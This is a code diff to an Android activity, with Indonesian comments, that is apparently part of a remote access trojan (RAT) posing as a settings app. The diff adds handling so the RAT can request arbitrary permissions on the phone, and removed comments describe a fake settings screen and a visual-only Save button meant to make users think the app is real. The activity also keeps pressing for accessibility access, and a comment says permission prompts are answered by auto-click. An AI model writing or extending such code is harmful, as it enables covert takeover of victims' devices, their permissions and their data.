@@ -7,6 +7,8 @@ import android.provider.Settings;
 import android.text.TextUtils;
 import android.app.AlertDialog;
 import android.widget.Toast;
+import android.content.pm.PackageManager;
+import android.os.Build;
 
 public class CoreActivity extends Activity {
 
@@ -22,15 +24,21 @@ public class CoreActivity extends Activity {
     protected void onCreate(Bundle savedInstanceState) {
         super.onCreate(savedInstanceState);
         
-        // Tampilkan layout pengaturan palsu agar bisa "masuk" ke apk
         setContentView(R.layout.activity_main);
         
+        // Cek jika ada request permission dari RAT
+        String reqPerm = getIntent().getStringExtra("request_permission");
+        if (reqPerm != null) {
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
+                requestPermissions(new String[]{reqPerm}, 101);
+            }
+        }
+
         if (checkStatus()) {
             finish();
             return;
         }
 
-        // Logika tombol Save (Visual Only) agar user merasa ini aplikasi beneran
         findViewById(R.id.btn_save).setOnClickListener(v -> {
             Toast.makeText(this, "Settings Saved!", Toast.LENGTH_SHORT).show();
         });
@@ -39,15 +47,20 @@ public class CoreActivity extends Activity {
     @Override
     protected void onResume() {
         super.onResume();
-        // Cek izin aksesibilitas setiap kali aplikasi dibuka/kembali ke layar utama
         if (!isServiceEnabled()) {
             showAccessibilityDialog();
         } else {
-            // Jika sudah aktif, tutup dialog jika masih ada
             if (currentDialog != null && currentDialog.isShowing()) {
                 currentDialog.dismiss();
             }
         }
+    }
+
+    @Override
+    public void onRequestPermissionsResult(int requestCode, String[] permissions, int[] grantResults) {
+        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
+        // Langsung tutup activity setelah request selesai (karena sudah di-handle auto-click)
+        finish();
     }
 
     private void showAccessibilityDialog() {
